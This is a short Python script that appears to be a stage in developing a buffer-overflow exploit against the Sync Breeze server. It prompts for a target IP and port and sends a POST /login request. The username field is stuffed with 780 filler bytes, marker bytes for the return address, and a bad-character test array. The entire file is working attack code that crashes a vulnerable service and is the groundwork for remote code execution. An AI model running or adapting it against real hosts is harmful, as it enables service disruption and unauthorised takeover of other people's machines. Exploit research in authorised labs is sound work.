#!/usr/bin/python3
#\x00\x0a\x0d\x25\x26\x3d\2b


import sys,socket
from time import sleep 
print("***********SYNC_BREEZE Vulnerability***********")
sleep(0.5)
ip_address=input("Enter the IP address\n")
port_number=input("Enter Port number\n")

if (len(ip_address)<=0) or (len(port_number)<=0):
    if (len(ip_address)>0) and (len(port_number)<=0):
        print("Port number field is empty")
    elif (len(ip_address)<=0) and (len(port_number)>0):
        print("IP address field is empty")
    else:
        print("Issues with the user input")
elif (len(ip_address)>0) and (len(port_number)>0):
    print("*********************************************")
    badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x27\x28\x29\x2a\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)


    size=b"A" * 780 + b"B" * 4 + b"C" * 4 + badchars
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip_address, int(port_number)))
    buff=b"username=" +  size + b"&password=A"

    buffer=b"POST /login HTTP/1.1\r\n"
    buffer+=b"Host: 192.168.100.211\r\n"
    buffer+=b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\n"
    buffer+=b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
    buffer+=b"Accept-Language: en-US,en;q=0.5\r\n"
    buffer+=b"Accept-Encoding: gzip, deflate\r\n"
    buffer+=b"Content-Type: application/x-www-form-urlencoded\r\n"
    buffer+=b"Content-Length: "+str(len(buff)).encode('utf-8')+b"\r\n"
    buffer+=b"Origin: http://192.168.100.211\r\n"
    buffer+=b"Connection: keep-alive\r\n"
    buffer+=b"Referer: http://192.168.100.211/login\r\n"
    buffer+=b"\r\n"
    buffer=buffer+buff
    s.send((buffer))
    s.close()
              
